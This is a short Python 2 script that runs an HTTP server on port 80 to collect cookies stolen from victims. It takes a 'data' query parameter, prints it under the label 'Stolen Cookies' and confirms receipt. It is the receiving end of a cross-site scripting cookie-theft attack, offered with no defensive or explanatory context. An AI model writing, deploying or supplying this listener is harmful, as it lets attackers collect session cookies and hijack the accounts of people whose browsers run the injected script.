import BaseHTTPServer
import urlparse

class RequestHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse.urlparse(self.path)
        query_data = urlparse.parse_qs(parsed_path.query)
        cookie_data = query_data.get('data', [''])[0]
        print("Stolen Cookies:", cookie_data)
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write("Received stolen cookies successfully!")
server_address = ('', 80)
httpd = BaseHTTPServer.HTTPServer(server_address, RequestHandler)
print('Starting server...')
httpd.serve_forever()